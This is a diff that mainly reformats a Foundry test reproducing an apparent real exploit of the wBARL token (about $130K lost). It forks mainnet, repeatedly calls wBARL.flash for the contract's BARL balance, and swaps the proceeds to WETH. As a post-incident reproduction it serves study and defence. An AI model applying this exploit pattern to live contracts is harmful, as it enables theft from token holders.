@@ -3,6 +3,7 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
 // @KeyInfo - Total Lost : ~$130K
 // Attacker : https://etherscan.io/address/0x7b3a6eff1c9925e509c2b01a389238c1fcc462b6
 // Attack Contracts : https://etherscan.io/address/0x356e7481b957be0165d6751a49b4b7194aef18d5
@@ -15,17 +16,19 @@ import "forge-std/Test.sol";
 // https://twitter.com/Phalcon_xyz/status/1751788389139992824
 
 interface IwBARL is IERC20 {
-
-    function flash(address _recipient, address _token, uint256 _amount, bytes memory _data) external;
+    function flash(
+        address _recipient,
+        address _token,
+        uint256 _amount,
+        bytes memory _data
+    ) external;
 
     function bond(address _token, uint256 _amount) external;
 
     function debond(uint256 _amount, address[] memory, uint8[] memory) external;
-
 }
 
 interface IUniswapV3Router {
-
     struct ExactInputParams {
         bytes path;
         address recipient;
@@ -34,17 +37,22 @@ interface IUniswapV3Router {
         uint256 amountOutMinimum;
     }
 
-    function exactInput(ExactInputParams memory params) external payable returns (uint256 amountOut);
-
+    function exactInput(
+        ExactInputParams memory params
+    ) external payable returns (uint256 amountOut);
 }
 
 contract ContractTest is Test {
-
-    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
-    IERC20 private constant BARL = IERC20(0x3e2324342bF5B8A1Dca42915f0489497203d640E);
-    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    IwBARL private constant wBARL = IwBARL(0x04c80Bb477890F3021F03B068238836Ee20aA0b8);
-    IUniswapV3Router private constant Router = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    IERC20 private constant DAI =
+        IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
+    IERC20 private constant BARL =
+        IERC20(0x3e2324342bF5B8A1Dca42915f0489497203d640E);
+    IERC20 private constant WETH =
+        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IwBARL private constant wBARL =
+        IwBARL(0x04c80Bb477890F3021F03B068238836Ee20aA0b8);
+    IUniswapV3Router private constant Router =
+        IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
 
     function setUp() public {
         vm.createSelectFork("mainnet", 19_106_654);
@@ -63,13 +71,20 @@ contract ContractTest is Test {
         deal(address(DAI), address(this), 200e18);
 
         emit log_named_decimal_uint(
-            "Exploiter WETH balance before attack", WETH.balanceOf(address(this)), WETH.decimals()
+            "Exploiter WETH balance before attack",
+            WETH.balanceOf(address(this)),
+            WETH.decimals()
         );
 
         uint8 i;
         while (i < 20) {
             DAI.approve(address(wBARL), 10e18);
-            wBARL.flash(address(this), address(BARL), BARL.balanceOf(address(wBARL)), "");
+            wBARL.flash(
+                address(this),
+                address(BARL),
+                BARL.balanceOf(address(wBARL)),
+                ""
+            );
             ++i;
         }
 
@@ -81,7 +96,9 @@ contract ContractTest is Test {
 
         BARLToWETH();
         emit log_named_decimal_uint(
-            "Exploiter WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals()
+            "Exploiter WETH balance after attack",
+            WETH.balanceOf(address(this)),
+            WETH.decimals()
         );
     }
 
@@ -92,15 +109,21 @@ contract ContractTest is Test {
 
     function BARLToWETH() internal {
         BARL.approve(address(Router), type(uint256).max);
-        bytes memory _path = abi.encodePacked(address(BARL), hex"002710", address(DAI), hex"0001f4", address(WETH));
-        IUniswapV3Router.ExactInputParams memory params = IUniswapV3Router.ExactInputParams({
-            path: _path,
-            recipient: address(this),
-            deadline: block.timestamp + 1000,
-            amountIn: BARL.balanceOf(address(this)),
-            amountOutMinimum: 0
-        });
+        bytes memory _path = abi.encodePacked(
+            address(BARL),
+            hex"002710",
+            address(DAI),
+            hex"0001f4",
+            address(WETH)
+        );
+        IUniswapV3Router.ExactInputParams memory params = IUniswapV3Router
+            .ExactInputParams({
+                path: _path,
+                recipient: address(this),
+                deadline: block.timestamp + 1000,
+                amountIn: BARL.balanceOf(address(this)),
+                amountOutMinimum: 0
+            });
         Router.exactInput(params);
     }
-
 }
